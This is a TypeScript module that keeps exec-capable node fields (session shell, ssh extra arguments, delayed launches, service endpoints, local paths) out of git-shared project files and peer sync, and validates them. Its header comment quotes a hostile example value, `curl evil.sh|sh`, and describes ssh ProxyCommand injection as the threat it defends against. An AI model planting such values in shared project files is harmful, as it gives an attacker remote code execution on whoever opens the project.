/**
 * Trust boundary for the node fields that end up EXECUTING something.
 *
 * `.nodeterm/project.json` is hostile input: it is git-shared, hand-editable, auto-adopted by
 * "Open folder…", and for an SSH project it lives on the remote host. A value that arrives from
 * that file was never typed by the local user, so it must never become a command. The codebase
 * already honors this for `initialCommand` (deliberately never serialized); two siblings reach an
 * exec the same way and are handled here:
 *
 *  - `NodeState.shell` — the session program. It lands as tmux `new-session`'s trailing command
 *    argument, and tmux runs a lone command argument THROUGH A SHELL. A cloned repo could ship
 *    `"shell": "curl evil.sh|sh"`, or simply point at a script committed in the repo.
 *  - `NodeState.ssh.extraArgs` — spliced verbatim into the `ssh` argv (`buildSshArgs`), where
 *    `-o ProxyCommand=<cmd>` makes ssh run `<cmd>` LOCALLY through /bin/sh.
 *
 * Both are legitimate when the LOCAL user sets them, so they are not deleted — they are made
 * MACHINE-LOCAL: `stripSharedNodeExec` keeps them out of every project file we write, and
 * `localNodeExec` / `applyLocalNodeExec` round-trip them through the machine-local workspace.json
 * index instead (`IndexEntryV3.localExec`). A project file therefore contributes NOTHING to either
 * field: the safe fallback (default shell / no extra ssh args) is what an unrecognized or foreign
 * value degrades to.
 *
 * `safeSessionProgram` is the second layer, applied where the value BECOMES a command (pty-manager),
 * in the same idiom as `permissionModeFlag` re-validating at the interpolation site: whatever the
 * path a value took to get there (a peer canvas mutation, a stale in-memory node, a future caller),
 * a program string carrying shell metacharacters is never handed to tmux.
 */

import { BUILTIN_AGENT_IDS, isPermissionMode } from './agents/config'
import { sshExtraArgsEnableLocalExec } from './ssh'
import type { AgentLaunchIntent, CanvasNodeState, PendingLaunch } from './types'
import type { NsisLocalPaths } from './nsis-form-types'
import { safeOpenWebUiLocalBinding, type OpenWebUiLocalBinding } from './open-webui-hosting'
import { normalizeVirtualMachineLocalPaths, safeVirtualMachinePath, type VirtualMachineLocalPaths } from './virtual-machine'
import { normalizeAwsIdentityBinding, type AwsIdentityBinding } from './aws-identity'
import { validateNextcloudManagedBinding, type NextcloudManagedBinding } from './nextcloud-managed'

/** Per-node exec values the LOCAL machine typed. Persisted only in the machine-local index. */
export interface LocalNodeExec {
  /** `NodeState.shell` — a custom session program for this node. */
  shell?: string
  /** `NodeState.terminalProfileId` — this machine's snapshotted Windows profile choice. */
  terminalProfileId?: string
  /** `NodeState.namedTerminalProfileId` — this machine's saved profile choice. */
  namedTerminalProfileId?: string
  /** Initial directory paired with the named profile, kept out of portable project content. */
  namedTerminalProfileCwd?: string
  /** `NodeState.ssh.extraArgs` — raw advanced ssh args for this node's connection. */
  sshExtraArgs?: string
  /** A delayed launch authorized on this machine; never accepted from project files or peers. */
  pendingLaunch?: PendingLaunch
  /**
   * `NodeState.serviceConnection` — where a service-manager node reaches the thing it manages.
   *
   * It belongs on this boundary for two reasons, and the second is the one that makes it urgent
   * rather than merely tidy:
   *
   *  - It is one person's environment. A host, a port, an internal name — none of that is
   *    meaningful to anybody else who clones the repository, and several of them are the sort of
   *    detail people would rather not publish along with their code.
   *  - For some kinds it is EXEC-ADJACENT. A Docker host reached over SSH turns an endpoint into
   *    the target of a command; a project file that could set it would be choosing which machine
   *    this one talks to. That is the same hazard `shell` and `ssh.extraArgs` are here for.
   *
   * It carries NO credential, by construction. A secret belongs in the operating-system credential
   * vault, and the record holds only enough to look one up. See `safeServiceEndpoint` for why an
   * endpoint with a password embedded in it is refused rather than stored.
   */
  serviceConnection?: ServiceConnection
  /** Open WebUI container and provider binding, kept in the machine-local index. */
  openWebUiLocalBinding?: OpenWebUiLocalBinding
  /** Managed Nextcloud destination paths and vault-key names, kept off shared project data. */
  nextcloudManagedBinding?: NextcloudManagedBinding
  /** Local AWS profile, region and endpoint binding. Contains no credential bytes. */
  awsIdentityBinding?: AwsIdentityBinding
  /**
   * `NodeState.nsisLocalPaths` — the NSIS installer-builder node's source/license/icon paths on
   * this machine. Belongs on this boundary for the same reason `serviceConnection` does: it is
   * one person's filesystem layout, and a shared project file that could set it would be one
   * person's disk paths appearing (or worse, being read) in everybody else's checkout.
   */
  nsisLocalPaths?: NsisLocalPaths
  /** Linux ISO/disk selections, kept out of git-shared project files. */
  virtualMachineLocalPaths?: VirtualMachineLocalPaths
  /** Photo/video source file on this machine. Never written to a shared project file. */
  mediaFilePath?: string
  /** Gallery asset id to this machine's source file. Never written to a shared project file. */
  mediaSourcePaths?: Record<string, string>
}

/**
 * How a service-manager node reaches its service. Deliberately small: anything that grows this
 * record should be asked whether it is really the connection, or whether it is state that belongs
 * where the service itself keeps it.
 */
export interface ServiceConnection {
  /** An absolute `http:`, `https:` or `ssh:` URL. Never carries userinfo — see below. */
  endpoint: string
  /**
   * Opaque key naming the entry in the OS credential vault, when this connection has a secret.
   * The SECRET IS NOT HERE and must never be: this record is written to a file in plain text, so a
   * token in it would be a token on disk, and the vault exists precisely so that never happens.
   */
  credentialKey?: string
}

/**
 * An endpoint we are willing to keep.
 *
 * Refused, and each for a concrete reason rather than out of caution:
 *
 *  - **Userinfo** (`https://user:pass@host`). This is the important one. A URL is the most common
 *    way a password gets pasted into a settings field, and storing it would put that password in
 *    plain text in workspace.json — where it would then survive in backups, in a support bundle,
 *    and in any screenshot of the file. Refusing sends the user to the vault instead, which is the
 *    only place it should have gone.
 *  - **Any scheme but http/https/ssh.** `file:` reads local disk, `javascript:` is a script, and a
 *    scheme nobody vetted is a scheme that does something nobody predicted.
 *  - **Control characters**, which is how a value smuggles a newline into whatever consumes it.
 *  - **Absurd length**, so a pathological value cannot be used to bloat the index.
 */
const SERVICE_SCHEMES = new Set(['http:', 'https:', 'ssh:'])
const MAX_ENDPOINT_LENGTH = 2048

export function safeServiceEndpoint(value: unknown): value is string {
  if (typeof value !== 'string' || value === '' || value.length > MAX_ENDPOINT_LENGTH) return false
  // Codepoint scan rather than a regex: a control-character class needs backslash escapes, and
  // this line has already been mangled once by a shell into a range that matched a HYPHEN — which
  // would have rejected every ordinary hostname while looking like a security check.
  for (let i = 0; i < value.length; i++) {
    const code = value.charCodeAt(i)
    if (code < 0x20 || code === 0x7f) return false
  }
  let url: URL
  try {
    url = new URL(value)
  } catch {
    return false
  }
  if (!SERVICE_SCHEMES.has(url.protocol)) return false
  // Read from the parsed URL rather than by regex on the raw string: the parser has already
  // resolved the percent-encodings a regex would have to guess at, and `user:pass%40word@host` is
  // exactly the shape a regex misses.
  //
  // A PASSWORD is refused everywhere, always. This record is written to disk in plain text, so a
  // password in it is a password in workspace.json, in every backup of that file, and in any
  // screenshot of it. Refusing sends the user to the credential vault, which is where it should
  // have gone.
  if (url.password !== '') return false
  // A USERNAME is different, and treating the two alike was wrong. `ssh://docker@host` is the
  // standard way to name a Docker host over SSH — it is the target, not a secret, and refusing it
  // would reject the single most likely endpoint this feature will ever be given. For http and
  // https a bare username is vestigial and far more often a half-pasted credential, so it stays
  // refused there.
  if (url.username !== '' && url.protocol !== 'ssh:') return false
  return url.hostname !== ''
}

const SAFE_CREDENTIAL_KEY = /^[A-Za-z0-9][A-Za-z0-9._:-]{0,255}$/

/** Keeps only a connection we are prepared to write down. Returns undefined rather than a partial
 *  record: half a connection is not a usable one, and storing it would produce a node that looks
 *  configured and cannot connect. */
export function safeServiceConnection(value: unknown): ServiceConnection | undefined {
  if (typeof value !== 'object' || value === null) return undefined
  const raw = value as Record<string, unknown>
  if (!safeServiceEndpoint(raw.endpoint)) return undefined
  const out: ServiceConnection = { endpoint: raw.endpoint }
  if (typeof raw.credentialKey === 'string' && SAFE_CREDENTIAL_KEY.test(raw.credentialKey)) {
    out.credentialKey = raw.credentialKey
  }
  return out
}

/** Bounds for `nsisLocalPaths`, so a hostile/hand-edited index entry cannot bloat the store or
 *  smuggle a control character through a path string. */
const MAX_NSIS_SOURCE_PATHS = 512
const MAX_NSIS_PATH_LENGTH = 4096

function safePathString(value: unknown): value is string {
  if (typeof value !== 'string' || value === '' || value.length > MAX_NSIS_PATH_LENGTH) return false
  for (let i = 0; i < value.length; i++) {
    const code = value.charCodeAt(i)
    if (code < 0x20 || code === 0x7f) return false
  }
  return true
}

const SAFE_MEDIA_ASSET_ID = /^[0-9a-f]{64}$/
const MAX_MEDIA_SOURCE_PATHS = 10_000

function safeMediaSourcePaths(value: unknown): Record<string, string> | undefined {
  if (!isRecord(value)) return undefined
  const out: Record<string, string> = {}
  for (const [assetId, sourcePath] of Object.entries(value).slice(0, MAX_MEDIA_SOURCE_PATHS)) {
    if (SAFE_MEDIA_ASSET_ID.test(assetId) && safePathString(sourcePath)) out[assetId] = sourcePath
  }
  return Object.keys(out).length > 0 ? out : undefined
}

function localMediaSourcePaths(node: CanvasNodeState): Record<string, string> | undefined {
  if (!Array.isArray(node.mediaAssets)) return undefined
  const out: Record<string, string> = {}
  for (const asset of node.mediaAssets.slice(0, MAX_MEDIA_SOURCE_PATHS)) {
    if (SAFE_MEDIA_ASSET_ID.test(asset.assetId) && safePathString(asset.sourcePath)) {
      out[asset.assetId] = asset.sourcePath
    }
  }
  return Object.keys(out).length > 0 ? out : undefined
}

function stripMediaPaths(node: CanvasNodeState): CanvasNodeState {
  const isMediaNode = node.kind === 'photo' || node.kind === 'video' || node.kind === 'gallery'
  const hasSourcePath = node.mediaAssets?.some((asset) => asset.sourcePath !== undefined) === true
  const hasFilePath = (node.kind === 'photo' || node.kind === 'video') && node.filePath !== undefined
  if (!isMediaNode || (!hasSourcePath && !hasFilePath)) return node
  const out: CanvasNodeState = { ...node }
  if (hasFilePath) delete out.filePath
  if (hasSourcePath) {
    out.mediaAssets = node.mediaAssets?.map(({ sourcePath: _sourcePath, ...asset }) => asset)
  }
  return out
}

function restoreMediaPaths(
  node: CanvasNodeState,
  local: Pick<LocalNodeExec, 'mediaFilePath' | 'mediaSourcePaths'> | undefined
): CanvasNodeState {
  if (node.kind !== 'photo' && node.kind !== 'video' && node.kind !== 'gallery') return node
  const mediaFilePath = safePathString(local?.mediaFilePath) ? local.mediaFilePath : undefined
  const mediaSourcePaths = safeMediaSourcePaths(local?.mediaSourcePaths)
  if (!mediaFilePath && !mediaSourcePaths) return node
  const out: CanvasNodeState = { ...node }
  if ((node.kind === 'photo' || node.kind === 'video') && mediaFilePath) out.filePath = mediaFilePath
  if (mediaSourcePaths && node.mediaAssets) {
    out.mediaAssets = node.mediaAssets.map((asset) => {
      const sourcePath = mediaSourcePaths[asset.assetId]
      return sourcePath ? { ...asset, sourcePath } : asset
    })
  }
  return out
}

/** Keeps only an `nsisLocalPaths` record we are prepared to write down. Tolerant, like
 *  `validKanban`: a malformed or hostile value degrades to a safe default (undefined, or an
 *  entry with the bad bits dropped) rather than throwing — this reads a machine-local index file
 *  that can still be hand-edited or written by an older/foreign build. */
export function safeNsisLocalPaths(value: unknown): NsisLocalPaths | undefined {
  if (typeof value !== 'object' || value === null) return undefined
  const raw = value as Record<string, unknown>
  const sourcePaths = Array.isArray(raw.sourcePaths)
    ? raw.sourcePaths.filter(safePathString).slice(0, MAX_NSIS_SOURCE_PATHS)
    : []
  const out: NsisLocalPaths = { sourcePaths }
  if (safePathString(raw.licensePath)) out.licensePath = raw.licensePath
  if (safePathString(raw.iconPath)) out.iconPath = raw.iconPath
  // An empty, otherwise-empty record carries no information worth persisting.
  if (sourcePaths.length === 0 && out.licensePath === undefined && out.iconPath === undefined) {
    return undefined
  }
  return out
}

/** Node id → the exec values that stay on this machine. */
export type LocalNodeExecMap = Record<string, LocalNodeExec>

/**
 * A session program must be ONE program, not a command line: tmux runs a lone command argument
 * through a shell, so anything a shell would interpret is refused. Absolute paths, bare names and
 * `~`-less relative paths are fine; whitespace, quotes, `;|&$()<>` … and a leading `-` (which tmux
 * would read as an option) are not.
 */
const SAFE_PROGRAM = /^[A-Za-z0-9_./+@:=-]+$/
const SAFE_OPAQUE_ID = /^[A-Za-z0-9][A-Za-z0-9._-]{0,255}$/
const SAFE_CUSTOM_AGENT_ID = /^custom:[A-Za-z0-9][A-Za-z0-9._-]{0,255}$/
const UUID_V4 = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i
const BUILTIN_AGENT_ID_SET = new Set<string>(BUILTIN_AGENT_IDS)
const MAX_PENDING_DEPS = 256
const MAX_INTENT_TEXT = 1024 * 1024

const isRecord = (value: unknown): value is Record<string, unknown> =>
  typeof value === 'object' && value !== null && !Array.isArray(value)

const isSafeAgentId = (value: unknown): value is string =>
  typeof value === 'string' &&
  (BUILTIN_AGENT_ID_SET.has(value) || SAFE_CUSTOM_AGENT_ID.test(value))

/**
 * Validate and deep-clone a locally authorized delayed launch before it enters or leaves the
 * trusted overlay. Reconstructing the allowlisted shape matters: workspace.json is hand-editable,
 * and retaining an unknown future field here could accidentally make it executable later.
 *
 * Legacy `{ after, command }` records are deliberately rejected. They were formerly written into
 * git-shared project files, so there is no provenance that can make their rendered shell source
 * trustworthy after an upgrade.
 */
function clonePendingLaunch(value: unknown): PendingLaunch | undefined {
  if (!isRecord(value)) return undefined
  if (
    !Array.isArray(value.after) ||
    value.after.length > MAX_PENDING_DEPS ||
    !value.after.every((id): id is string => typeof id === 'string' && SAFE_OPAQUE_ID.test(id)) ||
    typeof value.launchId !== 'string' ||
    !UUID_V4.test(value.launchId) ||
    !isRecord(value.launch)
  ) {
    return undefined
  }

  const raw = value.launch
  if (raw.kind === 'shell-command') {
    if (
      typeof raw.command !== 'string' ||
      raw.command.length === 0 ||
      raw.command.length > MAX_INTENT_TEXT
    )
      return undefined
    return {
      after: [...value.after],
      launchId: value.launchId,
      launch: { kind: 'shell-command', command: raw.command }
    }
  }

  if (
    raw.kind !== 'agent' ||
    (raw.action !== 'start' && raw.action !== 'resume') ||
    !isSafeAgentId(raw.agentId) ||
    (raw.permissionMode !== undefined && !isPermissionMode(raw.permissionMode))
  ) {
    return undefined
  }

  if (raw.action === 'start') {
    if (
      raw.sessionId !== undefined ||
      (raw.prompt !== undefined &&
        (typeof raw.prompt !== 'string' || raw.prompt.length > MAX_INTENT_TEXT)) ||
      (raw.newSessionId !== undefined &&
        (typeof raw.newSessionId !== 'string' || !SAFE_OPAQUE_ID.test(raw.newSessionId)))
    ) {
      return undefined
    }
    const launch: AgentLaunchIntent = {
      kind: 'agent', action: 'start', agentId: raw.agentId
    }
    if (raw.prompt !== undefined) launch.prompt = raw.prompt
    if (raw.permissionMode !== undefined) launch.permissionMode = raw.permissionMode
    if (raw.newSessionId !== undefined) launch.newSessionId = raw.newSessionId
    return { after: [...value.after], launchId: value.launchId, launch }
  }

  if (
    raw.prompt !== undefined ||
    raw.newSessionId !== undefined ||
    typeof raw.sessionId !== 'string' ||
    !SAFE_OPAQUE_ID.test(raw.sessionId)
  ) {
    return undefined
  }
  const launch: AgentLaunchIntent = {
    kind: 'agent', action: 'resume', agentId: raw.agentId, sessionId: raw.sessionId
  }
  if (raw.permissionMode !== undefined) launch.permissionMode = raw.permissionMode
  return { after: [...value.after], launchId: value.launchId, launch }
}

/**
 * Validate a session program at the point it becomes a command. Returns the program when it is
 * safe to hand to tmux/node-pty, else `undefined` — i.e. the caller falls back to the default
 * shell, which is exactly the pre-feature behavior. NEVER throws: an unrecognized value degrades
 * to the safe path, it does not block the launch.
 */
export function safeSessionProgram(shell: string | undefined): string | undefined {
  if (!shell) return undefined
  const s = shell.trim()
  if (!s || s.startsWith('-')) return undefined
  if (!SAFE_PROGRAM.test(s)) return undefined
  return s
}

/**
 * Strip every exec-enabling field from the nodes we are about to write into a SHARED project file.
 * The values survive on this machine via `localNodeExec` (below); what leaves for git/the remote
 * host carries no command or local profile selection of any kind.
 */
function stripNodeExec(n: CanvasNodeState): CanvasNodeState {
  const withoutMediaPaths = stripMediaPaths(n)
  if (
    withoutMediaPaths.shell === undefined &&
    withoutMediaPaths.terminalProfileId === undefined &&
    withoutMediaPaths.namedTerminalProfileId === undefined &&
    withoutMediaPaths.pendingLaunch === undefined &&
    withoutMediaPaths.serviceConnection === undefined &&
    withoutMediaPaths.openWebUiLocalBinding === undefined &&
    withoutMediaPaths.nextcloudManagedBinding === undefined &&
    withoutMediaPaths.awsIdentityBinding === undefined &&
    withoutMediaPaths.nsisLocalPaths === undefined &&
    withoutMediaPaths.virtualMachineLocalPaths === undefined &&
    withoutMediaPaths.ssh?.extraArgs === undefined &&
    withoutMediaPaths.ssh?.execTrusted === undefined
  )
    return withoutMediaPaths
  const out: CanvasNodeState = { ...withoutMediaPaths }
  const namedProfileHasLocalCwd = withoutMediaPaths.namedTerminalProfileId !== undefined
  delete out.shell
  delete out.terminalProfileId
  delete out.namedTerminalProfileId
  if (namedProfileHasLocalCwd) delete out.cwd
  delete out.pendingLaunch
  delete out.serviceConnection
  delete out.openWebUiLocalBinding
  delete out.nextcloudManagedBinding
  delete out.awsIdentityBinding
  delete out.nsisLocalPaths
  delete out.virtualMachineLocalPaths
  if (out.ssh) {
    // `execTrusted` goes with the value it vouches for. It is a MACHINE-LOCAL provenance marker:
    // if it could ride a document or a wire frame, a hostile one would simply set it to true.
    const { extraArgs: _extraArgs, execTrusted: _execTrusted, ...conn } = out.ssh
    out.ssh = conn
  }
  return out
}

export function stripSharedNodeExec(nodes: CanvasNodeState[]): CanvasNodeState[] {
  return nodes.map(stripNodeExec)
}

/**
 * Strip the exec-enabling fields from a node that arrived OVER THE WIRE (a canvas-sync peer's
 * mutation, or a relay client's).
 *
 * This is the other half of the trust boundary, and without it the disk half was worthless: a peer
 * mutation is applied VERBATIM (`isCanvasMutation` validates only id/position/size), and the next
 * save harvests whatever `shell` / `ssh.extraArgs` are now in the live nodes into the MACHINE-LOCAL
 * `workspace.json` — where they are re-attached as this machine's own values on every load, for
 * ever, surviving the peer leaving, being revoked, and the app restarting. The peer laundered an
 * exec field into the trusted store.
 *
 * A peer has no business setting any of these fields on our machine: they are per-machine settings
 * (which profile/program to run here, which ssh options to pass here), and none is meaningful on a
 * canvas that is merely being mirrored. So they are dropped at ingest, on every surface.
 */
export function sanitizeInboundNode(node: CanvasNodeState): CanvasNodeState {
  return stripNodeExec(node)
}

/**
 * Normalize delayed launches read from a MACHINE-LOCAL legacy/inline workspace record.
 *
 * Unlike `sanitizeInboundNode`, this path may retain a valid typed launch because the document is
 * the local user's own store. It still re-validates and deep-clones the value: workspace.json is
 * hand-editable, and old versions persisted `{ after, command }` without trustworthy provenance.
 */
export function normalizeLocalPendingLaunch(nodes: CanvasNodeState[]): CanvasNodeState[] {
  return nodes.map((node) => {
    if (node.pendingLaunch === undefined) return node
    const pendingLaunch = node.kind === 'terminal'
      ? clonePendingLaunch(node.pendingLaunch)
      : undefined
    const out: CanvasNodeState = { ...node }
    if (pendingLaunch === undefined) delete out.pendingLaunch
    else out.pendingLaunch = pendingLaunch
    return out
  })
}

/**
 * Accept a genuinely new terminal/agent node on a Windows desktop host. The sender's execution
 * fields are always stripped first; then the receiving host snapshots its own current default.
 * Existing nodes must not use this helper — their already-snapshotted local selection is carried
 * by `carryLocalNodeExec`, so a later default change never rewrites them.
 *
 * An absent default is the deliberate non-Windows/Server behavior: sanitize only.
 */
export function acceptNewInboundNode(
  node: CanvasNodeState,
  defaultTerminalProfileId?: string
): CanvasNodeState {
  const clean = sanitizeInboundNode(node)
  if (!defaultTerminalProfileId || clean.kind !== 'terminal' || clean.ssh) return clean
  return { ...clean, terminalProfileId: defaultTerminalProfileId }
}

/**
 * Apply an inbound node OVER the copy we already hold, keeping OUR exec fields on it.
 *
 * Stripping the peer's values is only half of it: an upsert REPLACES the node, so a teammate merely
 * dragging our ssh terminal would otherwise hand us back a copy with no `extraArgs` — and the next
 * save would harvest that empty node and erase the jump host from our own machine-local index. The
 * exec fields are per-machine, so they simply do not participate in the sync: theirs are dropped,
 * ours are carried across every mutation that touches the node.
 */
export function carryLocalNodeExec(
  prev: CanvasNodeState | undefined,
  next: CanvasNodeState
): CanvasNodeState {
  if (!prev) return next
  const extraArgs = prev.ssh?.extraArgs
  const pendingLaunch = next.kind === 'terminal' ? clonePendingLaunch(prev.pendingLaunch) : undefined
  const nsisPaths = safeNsisLocalPaths(prev.nsisLocalPaths)
  const vmPaths = normalizeVirtualMachineLocalPaths(prev.virtualMachineLocalPaths)
  const openWebUiBinding = prev.kind === 'open-webui-hosting' ? prev.openWebUiLocalBinding : undefined
  const awsIdentityBinding = normalizeAwsIdentityBinding(prev.awsIdentityBinding)
  const mediaFilePath = safePathString(prev.filePath) ? prev.filePath : undefined
  const mediaSourcePaths = localMediaSourcePaths(prev)
  const nextcloudBinding = prev.kind === 'nextcloud-managed' && next.kind === 'nextcloud-managed'
    ? (() => { try { return validateNextcloudManagedBinding(prev.nextcloudManagedBinding) } catch { return undefined } })()
    : undefined
  if (
    prev.shell === undefined &&
    prev.terminalProfileId === undefined &&
    prev.namedTerminalProfileId === undefined &&
    extraArgs === undefined &&
    pendingLaunch === undefined &&
    nsisPaths === undefined &&
    awsIdentityBinding === null &&
    Object.keys(vmPaths).length === 0 &&
    openWebUiBinding === undefined &&
    mediaFilePath === undefined &&
    mediaSourcePaths === undefined &&
    nextcloudBinding === undefined
  )
    return next
  const out: CanvasNodeState = { ...next }
  if (prev.shell !== undefined) out.shell = prev.shell
  if (prev.terminalProfileId !== undefined) out.terminalProfileId = prev.terminalProfileId
  if (prev.namedTerminalProfileId !== undefined) out.namedTerminalProfileId = prev.namedTerminalProfileId
  if (prev.namedTerminalProfileId !== undefined && prev.cwd !== undefined) out.cwd = prev.cwd
  if (extraArgs !== undefined && out.ssh)
    out.ssh = { ...out.ssh, extraArgs, execTrusted: prev.ssh?.execTrusted }
  if (pendingLaunch !== undefined) out.pendingLaunch = pendingLaunch
  if (nsisPaths !== undefined) out.nsisLocalPaths = nsisPaths
  if (Object.keys(vmPaths).length > 0) out.virtualMachineLocalPaths = vmPaths
  if (openWebUiBinding) out.openWebUiLocalBinding = openWebUiBinding
  if (nextcloudBinding) out.nextcloudManagedBinding = nextcloudBinding
  if (awsIdentityBinding) out.awsIdentityBinding = awsIdentityBinding
  return restoreMediaPaths(out, { mediaFilePath, mediaSourcePaths })
}

/** `sanitizeInboundNode` for a whole mutation (the stamps — `src`, `seq`, `seen` — are preserved).
 *  Only `upsert` carries a node; every other op (`remove`, and the edge ops, which carry nothing
 *  but ids) passes through untouched. */
export function sanitizeInboundMutation<T extends { op: string }>(m: T): T {
  if (m.op !== 'upsert') return m
  const up = m as unknown as { node: CanvasNodeState }
  const node = sanitizeInboundNode(up.node)
  return node === up.node ? m : ({ ...m, node } as T)
}

/**
 * Collect the machine-local exec values of these nodes (for the workspace.json index entry).
 *
 * The index is the TRUSTED store — whatever lands here is re-attached to the node on every future
 * load, as this machine's own value. So an inbound value must not be able to launder itself in
 * (see `sanitizeInboundNode`, which is the primary guard), and this collector re-checks what it is
 * about to bless:
 *  - `shell` — only if it still passes the exec-site validator. A program the exec site would
 *    refuse anyway has no business being persisted as trusted.
 *  - `ssh.extraArgs` — an exec-enabling value (a `ProxyCommand` & co) is stored only when it is
 *    `execTrusted`, i.e. a LOCAL producer set it (the user's SSH server store, or a previous
 *    machine-local index entry). Harmless args are stored either way, so nothing legitimate is lost.
 */
export function localNodeExec(nodes: CanvasNodeState[]): LocalNodeExecMap | undefined {
  const map: LocalNodeExecMap = {}
  for (const n of nodes) {
    const entry: LocalNodeExec = {}
    if (n.shell && safeSessionProgram(n.shell)) entry.shell = n.shell
    // The id is opaque here on purpose: availability is machine state and may change after the
    // node is saved. The trusted core resolver validates it at spawn and reports an unavailable
    // profile rather than silently switching shells. This boundary only decides provenance.
    if (n.terminalProfileId !== undefined) entry.terminalProfileId = n.terminalProfileId
    if (n.namedTerminalProfileId !== undefined) entry.namedTerminalProfileId = n.namedTerminalProfileId
    if (n.namedTerminalProfileId !== undefined && safePathString(n.cwd)) {
      entry.namedTerminalProfileCwd = n.cwd
    }
    const extraArgs = n.ssh?.extraArgs
    if (extraArgs && (n.ssh?.execTrusted || !sshExtraArgsEnableLocalExec(extraArgs)))
      entry.sshExtraArgs = extraArgs
    if (n.kind === 'terminal') entry.pendingLaunch = clonePendingLaunch(n.pendingLaunch)
    // Validated on the way IN as well as on the way out. This value reaches us from the live node,
    // which a peer mutation can have touched, so harvesting it unchecked would launder a foreign
    // endpoint into the trusted store — the exact laundering `sanitizeInboundNode` exists to stop.
    const conn = safeServiceConnection(n.serviceConnection)
    if (conn) entry.serviceConnection = conn
    if (n.kind === 'open-webui-hosting') {
      const openWebUiBinding = safeOpenWebUiLocalBinding(n.openWebUiLocalBinding)
      if (openWebUiBinding) entry.openWebUiLocalBinding = openWebUiBinding
    }
    const awsIdentityBinding = normalizeAwsIdentityBinding(n.awsIdentityBinding)
    if (awsIdentityBinding) entry.awsIdentityBinding = awsIdentityBinding
    const nextcloudBinding = n.kind === 'nextcloud-managed'
      ? (() => { try { return validateNextcloudManagedBinding(n.nextcloudManagedBinding) } catch { return undefined } })()
      : undefined
    if (nextcloudBinding) entry.nextcloudManagedBinding = nextcloudBinding
    const nsisPaths = safeNsisLocalPaths(n.nsisLocalPaths)
    if (nsisPaths) entry.nsisLocalPaths = nsisPaths
    const vmPaths = normalizeVirtualMachineLocalPaths(n.virtualMachineLocalPaths)
    if (safeVirtualMachinePath(vmPaths.isoPath) || safeVirtualMachinePath(vmPaths.diskPath)) {
      entry.virtualMachineLocalPaths = vmPaths
    }
    if ((n.kind === 'photo' || n.kind === 'video') && safePathString(n.filePath)) {
      entry.mediaFilePath = n.filePath
    }
    const mediaSourcePaths = localMediaSourcePaths(n)
    if (mediaSourcePaths) entry.mediaSourcePaths = mediaSourcePaths
    if (
      entry.shell ||
      entry.terminalProfileId !== undefined ||
      entry.namedTerminalProfileId !== undefined ||
      entry.namedTerminalProfileCwd !== undefined ||
      entry.sshExtraArgs ||
      entry.pendingLaunch ||
      entry.serviceConnection ||
      entry.openWebUiLocalBinding ||
      entry.awsIdentityBinding ||
      entry.nextcloudManagedBinding ||
      entry.nsisLocalPaths ||
      entry.virtualMachineLocalPaths ||
      entry.mediaFilePath ||
      entry.mediaSourcePaths
    )
      map[n.id] = entry
  }
  return Object.keys(map).length ? map : undefined
}

/**
 * Re-attach this machine's own exec values to nodes just read from a project file. Anything the
 * FILE carried in those fields is dropped first (it is not ours), so a hostile/cloned project.json
 * can only ever produce the safe default. Keyed by node id, which is stable (it is the tmux
 * session name) — a foreign file that happens to reuse an id can still only inherit a value the
 * local user typed themselves.
 */
export function applyLocalNodeExec(
  nodes: CanvasNodeState[],
  local: LocalNodeExecMap | undefined
): CanvasNodeState[] {
  return nodes.map((n) => {
    const mine = local?.[n.id]
    const out: CanvasNodeState = stripNodeExec(n)
    if (mine?.shell) out.shell = mine.shell
    if (mine?.terminalProfileId !== undefined) out.terminalProfileId = mine.terminalProfileId
    if (mine?.namedTerminalProfileId !== undefined) out.namedTerminalProfileId = mine.namedTerminalProfileId
    if (mine?.namedTerminalProfileCwd !== undefined) out.cwd = mine.namedTerminalProfileCwd
    if (out.ssh && mine?.sshExtraArgs) {
      // Ours: it came out of the machine-local index, so the exec site may honor an option like
      // ProxyCommand (a jump host is a legitimate thing to have configured).
      out.ssh = { ...out.ssh, extraArgs: mine.sshExtraArgs, execTrusted: true }
    }
    if (out.kind === 'terminal') {
      const pendingLaunch = clonePendingLaunch(mine?.pendingLaunch)
      if (pendingLaunch !== undefined) out.pendingLaunch = pendingLaunch
    }
    // Re-validated on restore too. The index is machine-local but it is still a FILE: a hand edit,
    // a partial write, or a record written by an older build all reach this line, and a connection
    // that would be refused today must not be honoured merely because it is already on disk.
    const conn = safeServiceConnection(mine?.serviceConnection)
    if (conn) out.serviceConnection = conn
    if (n.kind === 'open-webui-hosting') {
      const openWebUiBinding = safeOpenWebUiLocalBinding(mine?.openWebUiLocalBinding)
      if (openWebUiBinding) out.openWebUiLocalBinding = openWebUiBinding
    }
    const awsIdentityBinding = normalizeAwsIdentityBinding(mine?.awsIdentityBinding)
    if (awsIdentityBinding) out.awsIdentityBinding = awsIdentityBinding
    const nextcloudBinding = out.kind === 'nextcloud-managed'
      ? (() => { try { return validateNextcloudManagedBinding(mine?.nextcloudManagedBinding) } catch { return undefined } })()
      : undefined
    if (nextcloudBinding) out.nextcloudManagedBinding = nextcloudBinding
    const nsisPaths = safeNsisLocalPaths(mine?.nsisLocalPaths)
    if (nsisPaths) out.nsisLocalPaths = nsisPaths
    const vmPaths = normalizeVirtualMachineLocalPaths(mine?.virtualMachineLocalPaths)
    if (safeVirtualMachinePath(vmPaths.isoPath) || safeVirtualMachinePath(vmPaths.diskPath)) {
      out.virtualMachineLocalPaths = vmPaths
    }
    return restoreMediaPaths(out, mine)
  })
}
